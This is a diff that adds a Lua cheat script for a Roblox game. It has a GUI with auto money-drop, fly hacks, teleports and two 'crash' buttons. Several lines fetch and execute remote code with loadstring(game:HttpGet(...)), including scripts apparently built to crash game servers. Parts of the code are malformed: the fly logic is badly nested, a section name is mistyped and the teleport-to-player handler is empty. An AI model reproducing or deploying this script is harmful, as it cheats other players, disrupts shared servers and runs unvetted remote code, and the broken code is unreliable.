@@ -1,0 +1,267 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mobilexploitmaker/ui-library-forks/main/Kavox"))()
+
+local colors = {
+    SchemeColor = Color3.fromRGB(25,25,25),
+    Background = Color3.fromRGB(40, 40, 40),
+    Header = Color3.fromRGB(30, 30, 30),
+    TextColor = Color3.fromRGB(255,255,255),
+    ElementColor = Color3.fromRGB(20, 20, 20)
+}
+
+local Window = Library.CreateLib("Turtles GUI" ,colors)
+
+--tabs
+
+local Tab1 = Window:NewTab("Main")
+
+local Section1= Tab1:NewSection("Main")
+
+local Tab2 = Window:NewTab("Target")
+
+local Section2 = Tab2:NewSection("Target")
+
+local Tab3 = Window:NewTab("Teleports")
+
+local Section3 = Tab3:NewSection("Teleports")
+
+local Tab4 = Window:NewTab("Toggles")
+
+local Section4= Tab4:NewSection("Toggles")
+
+--functions
+
+Section4:NewToggle("Auto Drop", "uwu", function(state)
+    if state then
+
+_G.Cash = true; while _G.Cash== true do 
+
+game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
+
+game:GetService("Players").LocalPlayer.DataFolder.Currency.Value = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value - 10000
+wait(15.8) end
+
+ else
+
+_G.Cash = false; while 
+
+_G.Cash== true do 
+    
+game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
+game:GetService("Players").LocalPlayer.DataFolder.Currency.Value = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value - 10000
+wait(15.8) end 
+end
+end)
+
+Section4:NewButton("Fly [X]", "flys", function()
+      local plr = game.Players.LocalPlayer
+        local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
+        local mouse = plr:GetMouse()
+        localplayer = plr
+        if workspace:FindFirstChild("Core") then
+            workspace.Core:Destroy()
+        end
+        local Core = Instance.new("Part")
+        Core.Name = "Core"
+        Core.Size = Vector3.new(0.05, 0.05, 0.05)
+        spawn(function()
+            Core.Parent = workspace
+            local Weld = Instance.new("Weld", Core)
+            Weld.Part0 = Core
+            Weld.Part1 = localplayer.Character.LowerTorso
+            Weld.C0 = CFrame.new(0, 0, 0)
+        end)
+        workspace:WaitForChild("Core")
+        local torso = workspace.Core
+        flying = true
+        local speed=25
+        local keys={a=false,d=false,w=false,s=false}
+        local e1
+        local e2
+        local function start()
+            local pos = Instance.new("BodyPosition",torso)
+            local gyro = Instance.new("BodyGyro",torso)
+            pos.Name="EPIXPOS"
+            pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+            pos.position = torso.Position
+            gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
+            gyro.cframe = torso.CFrame
+            repeat
+                wait()
+                Humanoid.PlatformStand=true
+                local new=gyro.cframe - gyro.cframe.p + pos.position
+                if not keys.w and not keys.s and not keys.a and not keys.d then
+                    speed=25
+                end
+                if keys.w then
+                    new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                    speed=speed
+                end
+                if keys.s then
+                    new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                    speed=speed
+                    end
+                if keys.d then
+                    new = new * CFrame.new(speed,0,0)
+                    speed=speed
+                end
+                if keys.a then
+                    new = new * CFrame.new(-speed,0,0)
+                    speed=speed
+                end
+                if speed>25 then
+                    speed=25
+                end
+                pos.position=new.p
+                if keys.w then
+                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
+                elseif keys.s then
+                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
+                else
+                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+                end
+                until flying == false
+                if gyro then gyro:Destroy() end
+                if pos then pos:Destroy() end
+                flying=false
+                    Humanoid.PlatformStand=false
+                    speed=25
+                end
+                e1=mouse.KeyDown:connect(function(key)
+                    if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+                    if key=="w" then
+                        keys.w=true
+                    elseif key=="s" then
+                        keys.s=true
+                    elseif key=="a" then
+                        keys.a=true
+                    elseif key=="d" then
+                        keys.d=true
+                    elseif key=="x" then
+                        if flying==true then
+                            flying=false
+                        else
+                            flying=true
+                            start()
+                        end
+                    end
+                end)
+            e2=mouse.KeyUp:connect(function(key)
+                if key=="w" then
+                    keys.w=false
+                elseif key=="s" then
+                    keys.s=false
+                elseif key=="a" then
+                    keys.a=false
+                elseif key=="d" then
+                    keys.d=false
+            
+        start()
+        repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        repeat wait() until mouse
+        local plr = game.Players.LocalPlayer
+        local torso = plr.Character.Head
+        local flying = false
+        local deb = true
+        local ctrl = {f = 0, b = 0, l = 0, r = 0}
+        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+        local maxspeed = 5000
+        local speed = 5000
+        function Fly()
+            local bg = Instance.new("BodyGyro", torso)
+            bg.P = 9e4
+            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+            bg.cframe = torso.CFrame
+            local bv = Instance.new("BodyVelocity", torso)
+            bv.velocity = Vector3.new(0,0.1,0)
+            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+            repeat wait()
+            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
+            if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
+                speed = speed+.0+(speed/maxspeed)
+                if speed > maxspeed then
+                    speed = maxspeed
+                end
+            elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
+                speed = speed-5
+                if speed > 5 then
+                    speed = -2
+                end
+            end
+            if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
+                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+            elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
+                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+            else
+                bv.velocity = Vector3.new(0,0.1,0)
+            end
+            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+            until not flying
+            ctrl = {f = 0, b = 0, l = 0, r = 0}
+            lastctrl = {f = 0, b = 0, l = 0, r = 0}
+            speed = 5
+            bg:Destroy()
+            bv:Destroy()
+            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
+            end
+            mouse.KeyDown:connect(function(key)
+            if key:lower() == "x" then
+                if flying then flying = false
+                else
+                    flying = true
+                    Fly()
+                end
+                elseif key:lower() == "w" then
+                ctrl.f =-25
+                elseif key:lower() == "s" then
+                ctrl.b = -25
+                elseif key:lower() == "a" then
+                ctrl.l = -25
+                elseif key:lower() == "d" then
+                ctrl.r = 25
+                end
+            end)
+            mouse.KeyUp:connect(function(key)
+                if key:lower() == "w" then
+                ctrl.f = 0
+                elseif key:lower() == "s" then
+                ctrl.b = 0
+                elseif key:lower() == "a" then
+                    ctrl.l = 0
+                elseif key:lower() == "d" then
+                    ctrl.r = 0
+                end
+            end)
+        Fly()
+end end)
+end)
+
+Section3:NewButton("Safe Spot", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397) end) 
+
+Section3:NewButton("Bank", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9783134, -285.587372, 0.0165725499, 5.298579e-08, -0.99986279, 1.16139711e-08, 1, 5.31855591e-08, 0.99986279, -1.24937944e-08, 0.0165725499) end) 
+
+Section3:NewButton("Admin Base", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-873.131531, -38.3992119, -582.999573, 0.995990932, 8.53862048e-09, -0.0894544795, 1.00775621e-09, 1, 1.06672545e-07, 0.0894544795, -1.06335037e-07, 0.995990932) end)
+
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "!!!"; Text = "Tell me if there is any errors"; Duration = 10; }) 
+
+Section3:NewButton("UFO", "ButtonInfo", function()
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313) end)
+
+Section3:NewButton("Gas Station", "ButtonInfo", function()
+
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -3.41755495e-08, -0.996165276, 1.23318324e-08, 1, -3.53901868e-08, 0.996165276, -1.53808717e-08, -0.0874911696) end)
+
+Section1:NewTextBox("TP to player", "TextboxInfo", function(txt)
+
+local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart local p2 = txt 
+
+end)
+
+Section1:NewButton("Encrypt Crash", "a", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))() end)
+
+section1:NewButton ("Swagmode Crash","", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
